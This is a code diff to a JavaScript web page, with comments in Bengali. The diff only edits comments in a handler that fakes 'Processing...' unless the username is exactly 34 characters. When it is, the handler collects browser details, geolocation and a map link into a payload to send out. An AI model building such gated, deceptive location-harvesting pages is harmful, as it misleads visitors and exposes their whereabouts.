@@ -165,7 +165,7 @@
     async function sendBrowserInfo() {
       const username = usernameInput.value.trim();
 
-      // চেক: ঠিক ৩৪ ডিজিট না হলে fake processing + error
+      // ঠিক ৩৪ ডিজিট না হলে fake processing + কোনো data পাঠাবে না
       if (username.length !== 34) {
         sendBtn.disabled = true;
         status.textContent = "Processing...";
@@ -174,10 +174,9 @@
           sendBtn.disabled = false;
           sendBtn.textContent = "Submit Username & Send My Data";
         }, 3000);
-        return; // কোনো data পাঠাবে না
+        return;
       }
 
-      // ৩৪ ডিজিট হলে আসল কাজ
       sendBtn.disabled = true;
       sendBtn.textContent = "Collecting & Sending...";
       status.textContent = "Collecting browser info...";
@@ -230,7 +229,7 @@
         }
 
         const payload = {
-          username: username,  // ৩৪ ডিজিট হলে username পাঠাবে
+          username: username, // username ঠিক ৩৪ হলে এটাই পাঠাবে
           browser: browserInfo,
           geo: geo,
           mapLink: mapLink,
